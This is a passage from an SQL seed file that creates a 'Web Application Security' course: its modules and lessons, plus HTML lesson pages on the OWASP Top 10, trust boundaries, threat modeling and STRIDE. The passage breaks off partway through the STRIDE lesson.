-- ============================================================================
-- SEED 038: Complete course — "Web Application Security"
-- ----------------------------------------------------------------------------
-- Instructor : Elena Rodriguez   (10000000-0000-4000-8000-000000000005)
-- Category   : Cybersecurity     (20000000-0000-4000-8000-000000000005)
-- Level      : INTERMEDIATE · Access : SUBSCRIPTION · Status : PUBLISHED
-- Position   : 36
--
-- Structure (5 modules → 10 chapters → 28 lessons):
--   M1 Security Foundations    → C1 The OWASP Top 10 & the Security Mindset · C2 Threat Modeling
--   M2 Injection Attacks       → C3 SQL Injection · C4 Cross-Site Scripting
--   M3 Identity & Sessions     → C5 Authentication & Authorization · C6 Sessions, Cookies & CSRF
--   M4 Transport & Input Defense → C7 HTTPS, HSTS & Security Headers · C8 SSRF & Input Validation
--   M5 Testing & Capstone      → C9 Security Testing · C10 Capstone: Secure App Review
--
-- Content: 19 TEXT lessons with lesson_contents (self-contained HTML + inline
-- CSS, dollar-quoted so apostrophes need no escaping) and 9 QUIZ lessons with
-- 29 questions / 116 options across quizzes + `quizzes` and `quiz_options`.
--
-- Idempotency: every statement uses ON CONFLICT (id) DO NOTHING with fixed,
-- deterministic UUIDs, so this file can be re-run safely.
-- ============================================================================

-- ----------------------------------------------------------------------------
-- 1. COURSE + OBJECTIVES
-- ----------------------------------------------------------------------------

INSERT INTO courses (
  id, instructor_id, category_id, name, slug, description, status, level, access_type, position
) VALUES (
  '02600000-0000-4000-8000-000000000001',
  '10000000-0000-4000-8000-000000000005',
  '20000000-0000-4000-8000-000000000005',
  'Web Application Security',
  'web-application-security',
  'Defend the modern web app front to back: the OWASP Top 10, threat modeling with STRIDE, SQL injection, XSS, CSRF, SSRF, broken authN/authZ, secure sessions and cookies, HTTPS/HSTS, security headers, input validation, SAST/DAST, and a full secure app review of a sample store.',
  'PUBLISHED',
  'INTERMEDIATE',
  'SUBSCRIPTION',
  36
)
ON CONFLICT (id) DO NOTHING;

INSERT INTO course_objectives (id, course_id, content, position) VALUES
  ('02600000-0000-4000-8000-000000000011', '02600000-0000-4000-8000-000000000001', 'Explain the OWASP Top 10 and apply the core security mindset to real features.',                         1),
  ('02600000-0000-4000-8000-000000000012', '02600000-0000-4000-8000-000000000001', 'Model web threats with STRIDE and map attack surfaces at every trust boundary.',                          2),
  ('02600000-0000-4000-8000-000000000013', '02600000-0000-4000-8000-000000000001', 'Identify and fix the major injection classes: SQL injection, XSS, CSRF, and SSRF.',                        3),
  ('02600000-0000-4000-8000-000000000014', '02600000-0000-4000-8000-000000000001', 'Harden authentication, authorization, sessions, cookies, and transport security with HTTPS and HSTS.',  4),
  ('02600000-0000-4000-8000-000000000015', '02600000-0000-4000-8000-000000000001', 'Automate security testing and conduct a complete secure app review with a prioritized fix plan.',           5)
ON CONFLICT (id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 2. MODULES
-- ----------------------------------------------------------------------------

INSERT INTO modules (id, course_id, position, name, description, status) VALUES
  ('02600000-0000-4000-8000-000000000101', '02600000-0000-4000-8000-000000000001', 1, 'Security Foundations',    'Adopt the security mindset, learn the OWASP risk categories, and model threats with STRIDE.',        'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000102', '02600000-0000-4000-8000-000000000001', 2, 'Injection Attacks',       'Understand SQL injection and cross-site scripting, then build layered defenses.',                    'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000103', '02600000-0000-4000-8000-000000000001', 3, 'Identity & Sessions',     'Harden authentication, authorization, cookies, sessions, and request forgery defenses.',            'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000104', '02600000-0000-4000-8000-000000000001', 4, 'Transport & Input Defense','Enforce HTTPS, security headers, and rigorous server-side input validation.',                        'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000105', '02600000-0000-4000-8000-000000000001', 5, 'Testing & Capstone',      'Automate security testing and conduct a complete secure app review of a sample bookstore.',         'PUBLISHED')
ON CONFLICT (id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 3. CHAPTERS
-- ----------------------------------------------------------------------------

INSERT INTO chapters (id, module_id, position, name, description, status) VALUES
  ('02600000-0000-4000-8000-000000000201', '02600000-0000-4000-8000-000000000101', 1, 'The OWASP Top 10 & the Security Mindset', 'Learn the top web risks and how to think like a defender.',                          'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000202', '02600000-0000-4000-8000-000000000101', 2, 'Threat Modeling',                          'Turn assets and trust boundaries into a prioritized threat list with STRIDE.',       'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000203', '02600000-0000-4000-8000-000000000102', 1, 'SQL Injection',                            'Exploit and then eliminate the classic database attack.',                             'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000204', '02600000-0000-4000-8000-000000000102', 2, 'Cross-Site Scripting',                     'Stop stored, reflected, and DOM-based script injection.',                             'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000205', '02600000-0000-4000-8000-000000000103', 1, 'Authentication & Authorization',           'Fix flawed logins, weak password storage, and broken access control.',                'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000206', '02600000-0000-4000-8000-000000000103', 2, 'Sessions, Cookies & CSRF',                 'Secure the session lifecycle and block forged cross-site requests.',                  'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000207', '02600000-0000-4000-8000-000000000104', 1, 'HTTPS, HSTS & Security Headers',           'Encrypt traffic in transit and close exploit classes with response headers.',         'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000208', '02600000-0000-4000-8000-000000000104', 2, 'SSRF & Input Validation',                  'Harden the server against hostile input and outbound requests.',                      'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000209', '02600000-0000-4000-8000-000000000105', 1, 'Security Testing',                         'Add SAST, DAST, and dependency scanning to the development pipeline.',                'PUBLISHED'),
  ('02600000-0000-4000-8000-000000000210', '02600000-0000-4000-8000-000000000105', 2, 'Capstone: Secure App Review',              'Review the BookNook store end to end and prioritize remediation.',                    'PUBLISHED')
ON CONFLICT (id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 4. LESSONS  (id: 02600000-…-0301 .. 0328)
-- ----------------------------------------------------------------------------

INSERT INTO lessons (id, chapter_id, position, name, description, type, status, access_type, xp_points, duration_minutes) VALUES
  ('02600000-0000-4000-8000-000000000301', '02600000-0000-4000-8000-000000000201', 1, 'The OWASP Top 10 & the Security Mindset',   'Learn the top web risks and adopt the core defensive habits.',                        'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000302', '02600000-0000-4000-8000-000000000201', 2, 'How Web Requests Work: Trust Boundaries',   'Trace a request from browser to database and see where attacks hide.',                'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000303', '02600000-0000-4000-8000-000000000201', 3, 'Security Foundations Quiz',                 'Check your grasp of the OWASP Top 10 and the security mindset.',                      'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000304', '02600000-0000-4000-8000-000000000202', 1, 'Threat Modeling Basics',                    'Identify assets, adversaries, and data flows before writing code.',                   'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000305', '02600000-0000-4000-8000-000000000202', 2, 'STRIDE & Attack Surface Analysis',          'Enumerate threats systematically and map your attack surface.',                       'TEXT',  'PUBLISHED', 'FREE', 10, 10),
  ('02600000-0000-4000-8000-000000000306', '02600000-0000-4000-8000-000000000202', 3, 'Threat Modeling Quiz',                      'Test your threat modeling and STRIDE knowledge.',                                     'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000307', '02600000-0000-4000-8000-000000000203', 1, 'SQL Injection',                             'Understand how untrusted input becomes executable SQL.',                              'TEXT',  'PUBLISHED', 'FREE', 10, 10),
  ('02600000-0000-4000-8000-000000000308', '02600000-0000-4000-8000-000000000203', 2, 'Parameterized Queries & Defense in Depth',  'Neutralize injection with bound parameters and layered controls.',                    'TEXT',  'PUBLISHED', 'FREE', 10, 10),
  ('02600000-0000-4000-8000-000000000309', '02600000-0000-4000-8000-000000000203', 3, 'SQL Injection Quiz',                        'Check your injection knowledge.',                                                      'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000310', '02600000-0000-4000-8000-000000000204', 1, 'Cross-Site Scripting (XSS)',                'Learn reflected, stored, and DOM-based script injection.',                            'TEXT',  'PUBLISHED', 'FREE', 10, 10),
  ('02600000-0000-4000-8000-000000000311', '02600000-0000-4000-8000-000000000204', 2, 'Preventing XSS: Output Encoding & CSP',      'Encode per context and add a strict Content Security Policy.',                        'TEXT',  'PUBLISHED', 'FREE', 10, 10),
  ('02600000-0000-4000-8000-000000000312', '02600000-0000-4000-8000-000000000204', 3, 'XSS Quiz',                                   'Verify you can spot XSS risk.',                                                       'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000313', '02600000-0000-4000-8000-000000000205', 1, 'Authentication Flaws',                       'Fix weak logins, bad password storage, and missing rate limits.',                     'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000314', '02600000-0000-4000-8000-000000000205', 2, 'Authorization & Access Control',             'Close IDORs and enforce server-side object ownership.',                               'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000315', '02600000-0000-4000-8000-000000000205', 3, 'Authentication & Authorization Quiz',        'Test your access control knowledge.',                                                 'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000316', '02600000-0000-4000-8000-000000000206', 1, 'Secure Sessions & Cookies',                  'Set the right flags and manage the session lifecycle.',                               'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000317', '02600000-0000-4000-8000-000000000206', 2, 'CSRF & Session Fixation',                    'Block forged cross-site requests and pre-set session ids.',                           'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000318', '02600000-0000-4000-8000-000000000206', 3, 'Sessions & CSRF Quiz',                       'Check your session and forgery defense.',                                             'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000319', '02600000-0000-4000-8000-000000000207', 1, 'HTTPS, TLS & HSTS',                          'Encrypt traffic in transit and pin it with HSTS.',                                    'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000320', '02600000-0000-4000-8000-000000000207', 2, 'Security Headers',                           'Deploy CSP, framing, and MIME protections in one layer.',                             'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000321', '02600000-0000-4000-8000-000000000207', 3, 'Transport Security Quiz',                    'Test your HTTPS and header defenses.',                                                'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000322', '02600000-0000-4000-8000-000000000208', 1, 'Server-Side Request Forgery (SSRF)',         'Stop the server from fetching attacker-chosen URLs.',                                 'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000323', '02600000-0000-4000-8000-000000000208', 2, 'Input Validation & Hardened APIs',           'Validate shape, whitelist values, and harden the API surface.',                       'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000324', '02600000-0000-4000-8000-000000000208', 3, 'SSRF & Input Validation Quiz',                'Check your server-side hardening skills.',                                            'QUIZ',  'PUBLISHED', 'FREE', 15,  5),
  ('02600000-0000-4000-8000-000000000325', '02600000-0000-4000-8000-000000000209', 1, 'SAST, DAST & Dependency Scanning',           'Automate security checks from commit to staging.',                                    'TEXT',  'PUBLISHED', 'FREE', 10, 10),
  ('02600000-0000-4000-8000-000000000326', '02600000-0000-4000-8000-000000000210', 1, 'Capstone: BookNook Threat Model',            'Inventory the assets and model the threats of a sample bookstore app.',               'TEXT',  'PUBLISHED', 'FREE', 10,  8),
  ('02600000-0000-4000-8000-000000000327', '02600000-0000-4000-8000-000000000210', 2, 'Capstone: Secure App Review Walkthrough',    'Find seven real findings and build a prioritized fix plan.',                          'TEXT',  'PUBLISHED', 'FREE', 10, 12),
  ('02600000-0000-4000-8000-000000000328', '02600000-0000-4000-8000-000000000210', 3, 'Final Assessment',                           'Prove what you learned across the whole course.',                                     'QUIZ',  'PUBLISHED', 'FREE', 30, 10)
ON CONFLICT (id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 5. LESSON CONTENTS  (19 TEXT lessons, id: 02600000-…-0401 .. 0427)
--    Content = self-contained HTML doc with inline (scoped) CSS.
-- ----------------------------------------------------------------------------

INSERT INTO lesson_contents (id, lesson_id, position, name, content) VALUES
(
  '02600000-0000-4000-8000-000000000401',
  '02600000-0000-4000-8000-000000000301',
  1,
  'The OWASP Top 10 & the Security Mindset',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>The OWASP Top 10 &amp; the Security Mindset</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>The OWASP Top 10 &amp; the Security Mindset</h1>
  <p>Before you fix attacks, you must know which attacks matter most. The <strong>OWASP Top 10</strong> is a community-maintained ranking of the most critical web application security risks. It is the closest thing our industry has to a shared curriculum for web defense.</p>
  <h2>What is OWASP?</h2>
  <p>The Open Worldwide Application Security Project (OWASP) publishes free tools, checklists, and the famous Top 10. The 2021 edition is organized around <em>categories</em> of root causes rather than individual CVEs:</p>
  <table>
    <tr><th>Rank</th><th>Risk category</th><th>One-line summary</th></tr>
    <tr><td>A01</td><td>Broken Access Control</td><td>Users can act beyond their permissions.</td></tr>
    <tr><td>A02</td><td>Cryptographic Failures</td><td>Sensitive data is stored or sent unprotected.</td></tr>
    <tr><td>A03</td><td>Injection</td><td>Untrusted input runs as code or queries.</td></tr>
    <tr><td>A04</td><td>Insecure Design</td><td>Flaws baked in during architecture.</td></tr>
    <tr><td>A05</td><td>Security Misconfiguration</td><td>Defaults, headers, and errors left open.</td></tr>
    <tr><td>A06</td><td>Vulnerable Components</td><td>Known-bad libraries and dependencies.</td></tr>
    <tr><td>A07</td><td>Identification &amp; Auth Failures</td><td>Logins that are weak or easy to bypass.</td></tr>
    <tr><td>A08</td><td>Software &amp; Data Integrity Failures</td><td>Untrusted updates and insecure deserialization.</td></tr>
    <tr><td>A09</td><td>Security Logging &amp; Monitoring Failures</td><td>Attacks that go unnoticed.</td></tr>
    <tr><td>A10</td><td>SSRF</td><td>The server fetches attacker-chosen URLs.</td></tr>
  </table>
  <p>This course works through the family of attacks end to end: SQL injection, XSS, CSRF, SSRF, broken authN/authZ, and weak transport — then shows how to defend each one.</p>
  <h2>The security mindset</h2>
  <p>Defense is a set of reflexes you apply on every feature:</p>
  <ul>
    <li><strong>Assume breach.</strong> Design as if an attacker already holds some access.</li>
    <li><strong>Default deny.</strong> Everything not explicitly allowed is blocked.</li>
    <li><strong>Least privilege.</strong> Give every actor the minimum permissions it needs.</li>
    <li><strong>Defense in depth.</strong> Layer controls so one failure is not fatal.</li>
    <li><strong>Never trust input.</strong> Validate, encode, and never concatenate untrusted data into code or queries.</li>
  </ul>
  <p>Applied together these habits turn an application from a house with one big lock into a vault with many.</p>
  <div class="callout">
    <strong>Not a checklist</strong>
    <p>The Top 10 is a starting point, not a certificate. It does not cover every bug in your app — run a proper review for your specific features, frameworks, and deployment.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Your goal</strong>
    <p>By the end of this course you will walk through a real application, name its flaws with the vocabulary above, and produce a prioritized remediation plan.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000402',
  '02600000-0000-4000-8000-000000000302',
  1,
  'How Web Requests Work: Trust Boundaries',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>How Web Requests Work: Trust Boundaries</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>How Web Requests Work: Trust Boundaries</h1>
  <p>Every web attack is a story about data crossing a boundary. To understand where attacks live, trace one request from the user's browser to your database and back.</p>
  <pre class="code-block">Browser  --TLS-->  Load balancer  --TLS-->  App server  -->  DB
   |   (attacker controls   |   (your web process  |   (SQL engine)
   |    something here)     |    reads + parses)  |
User input enters here -----&gt; and is consumed everywhere down the line</pre>
  <p>Each hop is a <strong>trust boundary</strong>. On the client side, anyone can read your JavaScript, forge requests, and tamper with storage. On the server side, input arrives as opaque bytes until your code makes sense of them. And the database trusts the SQL you send it.</p>
  <h2>Where attacks land</h2>
  <table>
    <tr><th>Trust boundary</th><th>What can go wrong</th></tr>
    <tr><td>Browser / client</td><td>XSS, DOM clobbering, cookie theft, clickjacking</td></tr>
    <tr><td>Network in transit</td><td>Eavesdropping, MITM, SSL stripping, downgrade</td></tr>
    <tr><td>App server</td><td>SQL injection, CSRF, SSRF, broken authN/authZ</td></tr>
    <tr><td>File / service layer</td><td>Path traversal, XXE, insecure deserialization</td></tr>
    <tr><td>Database</td><td>Excessive privileges, sensitive data at rest</td></tr>
  </table>
  <h2>How a request really looks</h2>
  <pre class="code-block">GET /shop/search?q=phone&amp;sort=price HTTP/1.1
Host: shop.example.com
Cookie: session=abc123def456
User-Agent: Mozilla/5.0 ...</pre>
  <p>Three attack surfaces sit in this single line already: the path, the <span class="ic">q</span> parameter, and the session cookie. Untrusted data arrives in headers, query strings, bodies, cookies, file names, and URLs.</p>
  <div class="callout callout-info">
    <strong>Client-side is hostile territory</strong>
    <p>Never rely on the browser to enforce security. Disabled buttons, hidden fields, and client-side validation are conveniences, not controls. The server is the only place policy can actually be enforced.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Draw the map first</strong>
    <p>When you review an app, draw the request path for each feature before you hunt for bugs. Attacks almost always hide where input crosses a boundary without being checked.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000404',
  '02600000-0000-4000-8000-000000000304',
  1,
  'Threat Modeling Basics',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Threat Modeling Basics</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Threat Modeling Basics</h1>
  <p><strong>Threat modeling</strong> means answering four questions before you build: What are we protecting? Who would attack it? What could they do? How do we stop them? Doing it first beats discovering the answers in a breach report.</p>
  <h2>The four questions</h2>
  <table>
    <tr><th>Question</th><th>What you identify</th></tr>
    <tr><td>What are we protecting?</td><td>Assets: user data, sessions, secrets, money flow</td></tr>
    <tr><td>Who would attack it?</td><td>Adversaries: random bots, competitors, insiders</td></tr>
    <tr><td>What could they do?</td><td>Threats per feature once you know trust boundaries</td></tr>
    <tr><td>How do we stop them?</td><td>Controls mapped to each realistic threat</td></tr>
  </table>
  <h2>Drawing a data flow diagram</h2>
  <p>A tiny DFD for a login feature looks like this:</p>
  <pre class="code-block">[ User ] --login form--> [ Web app ] --check--> [ User store ]
                          |                              |
                          +--set session--> [ Session store ]
                          |
                          +--log event-----> [ Log sink    ]</pre>
  <p>Every arrow is a boundary where an attack can inject, replay, or intercept. Annotate each arrow with the threats that apply to it.</p>
  <h2>The workflow</h2>
  <ol>
    <li>Identify protected assets and categorize them (PII, credentials, cardinal data).</li>
    <li>List adversaries and their realistic motives and capabilities.</li>
    <li>Draw the DFD for every feature that touches an asset.</li>
    <li>Apply a threat taxonomy such as STRIDE to each arrow.</li>
    <li>Rank the resulting list and design controls in priority order.</li>
  </ol>
  <div class="callout">
    <strong>Invest in the map</strong>
    <p>An hour of drawing the request flows for a feature usually surfaces the vulnerable spots that automated scanners miss.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Revisit on change</strong>
    <p>Every new endpoint, library bump, and third-party integration is a new trust boundary crossing. Keep the model alive or it silently goes stale.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000405',
  '02600000-0000-4000-8000-000000000305',
  1,
  'STRIDE & Attack Surface Analysis',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>STRIDE &amp; Attack Surface Analysis</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>STRIDE &amp; Attack Surface Analysis</h1>
  <p><strong>STRIDE</strong> is a mnemonic checklist for enumerating threats against each data flow. It forces you to consider every way a flow can be abused instead of the two you already know.</p>
  <h2>The six categories</h2>
  <table>
    <tr><th>Letter</th><th>Threat</th><th>Example</th></tr>
    <tr><td>S</td><td>Spoofing</td><td>Faking a user identity or a source address</td></tr>
    <tr><td>T</td><td>Tampering</td><td>Modifying a request, cookie, or message in flight</td></tr>
    <tr><td>R</td><td>Repudiation</td><td>Denying an action because no audit trail exists</td></tr>
    <tr><td>I</td><td>Information disclosure</td><td>Leaking data through errors, logs, or responses</td></tr>
    <tr><td>D</td><td>Denial of service</td><td>Exhausting CPU, disk, or network with cheap requests</td></tr>
    <tr><td>E</td><td>Elevation of privilege</td><td>Turning limited access into admin access</td></tr>
  </table>
  <h2>Running STRIDE on one flow</h2>
  <pre class="code-block">Flow: user --POST /users/:id/avatar--> app --save--> object store

S  Can a user impersonate the owner of the avatar? (authz check?)
T  Can the binary be swapped by altering the upload content?
R  Is there a log record of who replaced the avatar?
I  Does the app echo back the object store path or an internal id?
D  Can an attacker upload a huge file and fill the disk?
E  Does the upload endpoint also accept administrator-only formats?</pre>
  <h2>Attack surface analysis</h2>
